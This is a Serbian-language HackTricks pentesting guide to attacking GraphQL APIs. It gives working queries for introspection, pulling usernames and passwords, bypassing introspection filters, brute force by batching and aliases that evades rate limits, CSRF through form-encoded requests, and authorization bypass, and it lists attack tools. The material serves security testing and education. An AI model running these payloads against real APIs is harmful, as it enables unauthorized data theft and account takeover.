# GraphQL

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uvod

GraphQL je **istican** kao **efikasna alternativa** REST API-ju, nude캖i pojednostavljen pristup za upitivanje podataka sa backend-a. Za razliku od REST-a, koji 캜esto zahteva brojne zahteve na razli캜itim endpoint-ima kako bi se prikupili podaci, GraphQL omogu캖ava dobijanje svih potrebnih informacija putem **jednog zahteva**. Ovo pojednostavljenje zna캜ajno **poma쬰 developerima** smanjuju캖i slo쬰nost njihovih procesa prikupljanja podataka.

## GraphQL i bezbednost

Sa pojavom novih tehnologija, uklju캜uju캖i GraphQL, pojavljuju se i nove bezbednosne ranjivosti. Va쬹o je napomenuti da **GraphQL ne uklju캜uje mehanizme za autentifikaciju po default-u**. Odgovornost je developera da implementiraju takve bezbednosne mere. Bez odgovaraju캖e autentifikacije, GraphQL endpoint-i mogu otkriti osetljive informacije neautentifikovanim korisnicima, predstavljaju캖i zna캜ajan bezbednosni rizik.

### Napadi brute force na direktorijume i GraphQL

Da bi se identifikovali izlo쬰ni GraphQL instanci, preporu캜uje se uklju캜ivanje odre캠enih putanja u napade brute force na direktorijume. Ove putanje su:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Identifikacija otvorenih GraphQL instanci omogu캖ava pregled podr쬬nih upita. Ovo je klju캜no za razumevanje podataka koji su dostupni putem endpoint-a. GraphQL-ov sistem introspekcije olak코ava ovo detaljisanjem upita koje 코ema podr쬬va. Za vi코e informacija o tome, pogledajte GraphQL dokumentaciju o introspekciji: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

Alat [**graphw00f**](https://github.com/dolevf/graphw00f) je sposoban da otkrije koji GraphQL engine se koristi na serveru, a zatim ispisuje neke korisne informacije za bezbednosnog auditora.

#### Univerzalni upiti <a href="#universal-queries" id="universal-queries"></a>

Da biste proverili da li je URL GraphQL servis, mo쬰 se poslati **univerzalni upit**, `query{__typename}`. Ako odgovor sadr쬴 `{"data": {"__typename": "Query"}}`, potvr캠uje da URL hostuje GraphQL endpoint. Ova metoda se oslanja na GraphQL-ovu `__typename` polje, koje otkriva tip objekta koji je upitan.
```javascript
query{__typename}
```
### Osnovno prebrojavanje

Graphql obi캜no podr쬬va **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). Iako je iz sigurnosnih razloga preporu캜ljivo dozvoliti samo json kako bi se spre캜ili CSRF napadi.

#### Introspekcija

Da biste koristili introspekciju za otkrivanje informacija o 코emi, upitajte polje `__schema`. Ovo polje je dostupno na korenskom tipu svih upita.
```bash
query={__schema{types{name,fields{name}}}}
```
Sa ovim upitom 캖ete prona캖i ime svih tipova koji se koriste:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Sa ovim upitom mo쬰te izvu캖i sve tipove, polja i argumente (i tip argumenata). Ovo 캖e biti veoma korisno da biste znali kako da upitate bazu podataka.

![](<../../.gitbook/assets/image (207) (3).png>)

**Gre코ke**

Interesantno je znati da li 캖e **gre코ke** biti **prikazane**, jer 캖e pru쬴ti korisne **informacije**.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**Enumeriraj 코emu baze podataka putem introspekcije**

{% hint style="info" %}
Ako je omogu캖ena introspekcija, ali gornji upit ne radi, poku코ajte ukloniti direktive `onOperation`, `onFragment` i `onField` iz strukture upita.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Inline inspekcijski upit:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Poslednja linija koda je GraphQL upit koji 캖e izlistati sve meta-informacije iz GraphQL-a (imena objekata, parametri, tipovi...)

![](<../../.gitbook/assets/image (206).png>)

Ako je omogu캖ena introspekcija, mo쬰te koristiti [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) da biste u GUI-ju videli sve opcije.

### Upiti

Sada kada znamo kakve informacije su sa캜uvane u bazi podataka, poku코ajmo **izvu캖i neke vrednosti**.

U introspekciji mo쬰te prona캖i **koji objekat mo쬰te direktno upitati** (jer ne mo쬰te upitati objekat samo zato 코to postoji). Na slede캖oj slici mo쬰te videti da se "_queryType_" zove "_Query_" i da je jedno od polja objekta "_Query_" "_flags_", koji je tako캠e tip objekta. Stoga mo쬰te upitati objekat flag.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Primetite da je tip upita "_flags_" "_Flags_", a ovaj objekat je definisan kao 코to je prikazano ispod:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Mo쬰te videti da su objekti "_Flags_" sastavljeni od **imena** i **vrednosti**. Zatim mo쬰te dobiti sva imena i vrednosti zastava upitom:
```javascript
query={flags{name, value}}
```
Imajte na umu da u slu캜aju da je **objekat za upit** **primitivni tip** kao 코to je **string** kao u slede캖em primeru

![](<../../.gitbook/assets/image (441).png>)

Mo쬰te ga jednostavno upitati sa:
```javascript
query={hiddenFlags}
```
U drugom primeru gde su postojala 2 objekta unutar "_Query_" tipa objekta: "_user_" i "_users_".\
Ako ovi objekti ne zahtevaju nikakav argument za pretragu, mo쬰te **dobiti sve informacije iz njih** tako 코to 캖ete samo **tra쬴ti** podatke koje 쬰lite. U ovom primeru sa interneta mo쬰te izvu캖i sa캜uvane korisni캜ke imene i lozinke:

![](<../../.gitbook/assets/image (208).png>)

Me캠utim, u ovom primeru, ako poku코ate to da uradite, dobi캖ete ovu **gre코ku**:

![](<../../.gitbook/assets/image (210).png>)

Izgleda da 캖e pretraga biti izvr코ena koriste캖i "_**uid**_" argument tipa _**Int**_.\
U svakom slu캜aju, ve캖 smo znali da je u odeljku [Osnovna enumeracija](graphql.md#basic-enumeration) predlo쬰n upit koji nam je prikazivao sve potrebne informacije: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Ako pro캜itate prilo쬰nu sliku kada pokrenem taj upit, vide캖ete da je "_**user**_" imao **arg** "_**uid**_" tipa _Int_.

Dakle, izvr코avaju캖i neki lagani _**uid**_ bruteforce, otkrio sam da se u _**uid**=**1**_ dobijaju korisni캜ko ime i lozinka:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Primetite da sam **otkrio** da mogu da tra쬴m **parametre** "_**user**_" i "_**password**_" jer ako poku코am da prona캠em ne코to 코to ne postoji (`query={user(uid:1){noExists}}`) dobijam ovu gre코ku:

![](<../../.gitbook/assets/image (213).png>)

I tokom faze **enumeracije** otkrio sam da objekat "_**dbuser**_" ima polja "_**user**_" i "_**password**_.

**Triks sa ispisom upita u string formatu (hvala @BinaryShadow\_)**

Ako mo쬰te pretra쬴vati po polju tipa string, kao 코to je: `query={theusers(description: ""){username,password}}` i **tra쬴te prazan string**, to 캖e **ispisati sve podatke**. (_Napomena: ovaj primer nije povezan sa primerom iz tutorijala, za ovaj primer pretpostavite da mo쬰te pretra쬴vati koriste캖i "**theusers**" preko polja tipa String koje se zove "**description**"_).

### Pretraga

U ovom okru쬰nju, **baza podataka** sadr쬴 **osobe** i **filmove**. **Osobe** se identifikuju preko svoje **e-po코te** i **imena**; **filmovi** preko svog **imena** i **ocene**. **Osobe** mogu biti prijatelji jedni sa drugima i tako캠e imaju filmove, 코to ukazuje na odnose unutar baze podataka.

Mo쬰te **pretra쬴vati** osobe **po** imenu i dobiti njihove e-po코te:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Mo쬰te **pretra쬴vati** osobe **po** imenu i dobiti informacije o njihovim **pretpla캖enim** **filmovima**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Obratite pa쬹ju kako je nazna캜eno da se dobije `name` od `subscribedMovies` osobe.

Tako캠e mo쬰te **pretra쬴vati vi코e objekata istovremeno**. U ovom slu캜aju, vr코i se pretraga 2 filma:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ili 캜ak **odnosi nekoliko razli캜itih objekata koriste캖i alias-e**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutacije

**Mutacije se koriste za pravljenje promena na serverskoj strani.**

U **introspekciji** mo쬰te prona캖i **deklarisane** **mutacije**. Na slede캖oj slici "_MutationType_" se naziva "_Mutation_" i objekat "_Mutation_" sadr쬴 imena mutacija (kao 코to je "_addPerson_" u ovom slu캜aju):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

U ovom okru쬰nju, **baza podataka** sadr쬴 **osobe** i **filmove**. **Osobe** se identifikuju preko svog **emaila** i **imena**; **filmovi** preko svog **imena** i **ocene**. **Osobe** mogu biti prijatelji jedni sa drugima i tako캠e imati filmove, 코to ukazuje na odnose unutar baze podataka.

Mutacija za **kreiranje novih** filmova u bazi podataka mo쬰 izgledati ovako (u ovom primeru mutacija se naziva `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Primetite kako su i vrednosti i tipovi podataka nazna캜eni u upitu.**

Dodatno, baza podr쬬va **mutaciju** operacije, nazvanu `addPerson`, koja omogu캖ava kreiranje **osoba** zajedno sa njihovim povezivanjem sa postoje캖im **prijateljima** i **filmovima**. Va쬹o je napomenuti da prijatelji i filmovi moraju ve캖 postojati u bazi podataka pre nego 코to se pove쬿 sa novokreiranom osobom.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Grupisanje brute-force napada u jednom API zahtevu

Ove informacije su preuzete sa [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autentifikacija putem GraphQL API-ja sa **istovremenim slanjem mnogo upita sa razli캜itim akreditacijama** radi provere. To je klasi캜an brute force napad, ali sada je mogu캖e poslati vi코e od jednog para korisni캜kog imena/lozinke u jednom HTTP zahtevu zbog mogu캖nosti grupisanja u GraphQL-u. Ovaj pristup bi prevario aplikacije za spoljno pra캖enje stope i u캜inio da izgleda kao da je sve u redu i da nema botova koji poku코avaju da pogode lozinke.

U nastavku mo쬰te videti najjednostavniji prikaz zahteva za autentifikaciju aplikacije, sa **3 razli캜ita para email/lozinka odjednom**. O캜igledno je mogu캖e poslati hiljade u jednom zahtevu na isti na캜in:

![](<../../.gitbook/assets/image (182) (1).png>)

Kao 코to mo쬰mo videti sa slike odgovora, prvi i tre캖i zahtev vratili su _null_ i prikazali odgovaraju캖e informacije u odeljku _error_. **Druga mutacija je imala ispravne autentifikacione** podatke i odgovor je imao ispravan token za autentifikaciju sesije.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL bez introspekcije

Sve vi코e **graphql endpointa onemogu캖ava introspekciju**. Me캠utim, gre코ke koje graphql baca kada primi neo캜ekivan zahtev su dovoljne za alate poput [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) da rekonstrui코u ve캖i deo 코eme.

Osim toga, Burp Suite ekstenzija [**GraphQuail**](https://github.com/forcesunseen/graphquail) **prati GraphQL API zahteve koji prolaze kroz Burp** i **gradi** internu GraphQL **코emu** sa svakim novim upitom koji vidi. Tako캠e mo쬰 prikazati 코emu za GraphiQL i Voyager. Ekstenzija vra캖a la쬹i odgovor kada primi introspekcioni upit. Kao rezultat, GraphQuail prikazuje sve upite, argumente i polja koja su dostupna za upotrebu u okviru API-ja. Za vi코e informacija [**proverite ovo**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Lepa **wordlist** za otkrivanje [**GraphQL entiteta mo쬰 se prona캖i ovde**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Zaobila쬰nje odbrana GraphQL introspekcije <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **Zaobila쬰nje odbrana GraphQL introspekcije**

Da bi se zaobi코le restrikcije na introspekcijske upite u API-ima, efikasno je ubaciti **specijalni karakter nakon klju캜ne re캜i `__schema`**. Ova metoda iskori코캖ava uobi캜ajene propuste programera u regex obrascima koji imaju za cilj blokiranje introspekcije fokusiranjem na klju캜nu re캜 `__schema`. Dodavanjem karaktera poput **razmaka, novih linija i zareza**, koje GraphQL ignori코e, ali mo쬯a nisu uzeti u obzir u regex-u, restrikcije mogu biti zaobi캠ene. Na primer, introspekcijski upit sa novom linijom nakon `__schema` mo쬰 zaobi캖i takve odbrane:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Ako ne uspete, razmotrite alternativne metode zahteva, kao 코to su **GET zahtevi** ili **POST sa `x-www-form-urlencoded`**, jer se ograni캜enja mogu odnositi samo na POST zahteve.

### **Otkrivanje izlo쬰nih GraphQL struktura**

Kada je introspekcija onemogu캖ena, pregledanje izvornog koda veb sajta radi pronala쬰nja unapred u캜itanih upita u JavaScript bibliotekama je korisna strategija. Ovi upiti se mogu prona캖i koriste캖i karticu `Sources` u alatima za razvoj, pru쬬ju캖i uvid u 코emu API-ja i otkrivaju캖i potencijalno **izlo쬰ne osetljive upite**. Komande za pretragu unutar alata za razvoj su:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF u GraphQL-u

Ako ne znate 코ta je CSRF, pro캜itajte slede캖u stranicu:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Tamo 캖ete mo캖i da prona캠ete nekoliko GraphQL endpointa **konfigurisanih bez CSRF tokena**.

Imajte na umu da se GraphQL zahtevi obi캜no 코alju putem POST zahteva koriste캖i Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Me캠utim, ve캖ina GraphQL krajnjih ta캜aka tako캠e podr쬬va **`form-urlencoded` POST zahteve:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Stoga, po코to se CSRF zahtevi poput prethodnih 코alju **bez prethodnih zahteva**, mogu캖e je **izvr코iti** **promene** u GraphQL-u zloupotrebom CSRF-a.

Me캠utim, imajte na umu da je nova podrazumevana vrednost kola캜i캖a za `samesite` zastavicu u Chrome-u `Lax`. To zna캜i da 캖e kola캜i캖 biti poslat samo sa veb stranice tre캖e strane u GET zahtevima.

Imajte na umu da je obi캜no mogu캖e poslati **upit** **zahtev** i kao **GET** **zahtev, a CSRF token mo쬯a ne캖e biti validiran u GET zahtevu.**

Tako캠e, zloupotrebom [**XS-Search**](../../pentesting-web/xs-search.md) **napada** mo쬰 biti mogu캖e izvu캖i sadr쬬j sa GraphQL endpointa zloupotrebom korisni캜kih akreditacija.

Za vi코e informacija **proverite** [**originalni post ovde**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorizacija u GraphQL-u

Mnoge GraphQL funkcije definisane na endpointu mogu proveravati samo autentifikaciju zahtevaoca, ali ne i autorizaciju.

Izmena ulaznih promenljivih upita mo쬰 dovesti do **procurivanja** osetljivih detalja o nalogu [leaked](https://hackerone.com/reports/792927).

Mutacija mo쬰 캜ak dovesti do preuzimanja naloga poku코avaju캖i da izmeni podatke drugih naloga.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Zaobila쬰nje autorizacije u GraphQL-u

[Povezivanje upita](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) mo쬰 zaobi캖i slab sistem autentifikacije.

U donjem primeru mo쬰te videti da je operacija "forgotPassword" i da bi trebalo da izvr코i samo pripadaju캖i upit forgotPassword. Ovo se mo쬰 zaobi캖i dodavanjem upita na kraju, u ovom slu캜aju dodajemo "register" i promenljivu korisnika kako bi sistem registrovao novog korisnika.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Zaobila쬰nje ograni캜enja brzine kori코캖enjem aliasa u GraphQL-u

U GraphQL-u, aliasi su mo캖na funkcionalnost koja omogu캖ava **eksplicitno imenovanje svojstava** prilikom slanja API zahteva. Ova mogu캖nost je posebno korisna za dobijanje **vi코e instanci istog tipa** objekta u jednom zahtevu. Aliasi se mogu koristiti kako bi se prevazi코la ograni캜enja koja spre캜avaju GraphQL objekte da imaju vi코e svojstava sa istim imenom.

Za detaljnije razumevanje aliasa u GraphQL-u, preporu캜uje se slede캖i resurs: [Aliasi](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Iako je primarni cilj aliasa smanjenje potrebe za brojnim API pozivima, identifikovan je i neplanirani slu캜aj upotrebe gde se aliasi mogu iskoristiti za izvr코avanje napada brute force na GraphQL endpoint. Ovo je mogu캖e jer su neki endpointi za코ti캖eni ograni캜iva캜ima brzine dizajniranim da spre캜e napade brute force ograni캜avanjem **broja HTTP zahteva**. Me캠utim, ovi ograni캜iva캜i brzine mo쬯a ne uzimaju u obzir broj operacija u svakom zahtevu. S obzirom da aliasi omogu캖avaju uklju캜ivanje vi코e upita u jedan HTTP zahtev, oni mogu zaobi캖i takva ograni캜enja brzine.

Razmotrite donji primer koji ilustruje kako se mogu koristiti aliasirani upiti za proveru validnosti kodova za popust u prodavnici. Ovaj metod mo쬰 zaobi캖i ograni캜enje brzine jer kompilira nekoliko upita u jedan HTTP zahtev, 코to potencijalno omogu캖ava proveru brojnih kodova za popust istovremeno.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Alati

### Skeneri ranjivosti

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Alat koji se mo쬰 koristiti za preuzimanje 코ema i pretragu osetljivih podataka, testiranje autorizacije, brute force 코ema i pronala쬰nje putanja do odre캠enog tipa.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Mo쬰 se koristiti samostalno ili kao [Burp ekstenzija](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Mo쬰 se koristiti kao CLI klijent i za automatizaciju napada.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Alat koji navodi razli캜ite na캜ine dostizanja odre캠enog tipa u GraphQL 코emi.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp ekstenzija za napredno testiranje GraphQL-a. _**Scanner**_ je jezgro InQL v5.0, gde mo쬰te analizirati GraphQL endpoint ili lokalni introspekcioni fajl 코eme. Automatski generi코e sve mogu캖e upite i mutacije, organizuju캖i ih u strukturiran prikaz za analizu. Komponenta _**Attacker**_ omogu캖ava pokretanje grupnih GraphQL napada, 코to mo쬰 biti korisno za zaobila쬰nje lo코e implementiranih ograni캜enja brzine.

### Klijenti

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Grafi캜ki klijent
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Grafi캜ki klijent

### Automatski testovi

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video koji obja코njava AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Reference

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
